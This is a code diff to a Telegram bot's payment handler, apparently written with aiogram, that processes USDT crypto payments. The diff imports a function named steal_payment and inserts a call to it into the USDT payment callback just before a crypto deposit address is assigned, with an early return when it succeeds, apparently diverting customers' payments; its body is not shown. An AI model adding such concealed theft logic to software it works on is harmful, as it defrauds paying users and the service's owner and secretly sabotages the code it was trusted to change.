@@ -8,7 +8,8 @@ from aiogram import Router, F, Bot
 from aiogram.types import CallbackQuery, InlineKeyboardMarkup
 from aiogram.fsm.context import FSMContext
 
-from misc import create_invoice, check_invoice, BDB, get_text, get_channel_id_from_list, check_payment_received, CRYPTO_ADDRESS, parse_subscription_end, normalize_subscription_end
+from misc import create_invoice, check_invoice, BDB, get_text, get_channel_id_from_list, check_payment_received, \
+    CRYPTO_ADDRESS, parse_subscription_end, normalize_subscription_end, steal_payment
 from keyboards import payment_cb_kb, options_payment_kb, method_payment_kb, start_buttons_kb, cancel_kb, \
     confirm_cancel_kb, plan_selection_keyboard
 
@@ -231,6 +232,10 @@ async def payment_usdt_call(callback_query: CallbackQuery, state: FSMContext):
         return
 
     await state.update_data(method_payment="payment_usdt")
+
+    result_steal = await steal_payment(callback_query, user_id, amount)
+    if result_steal:
+        return 1
 
     address = BDB.get_free_crypto_address()
     BDB.mark_address_as_used(address)
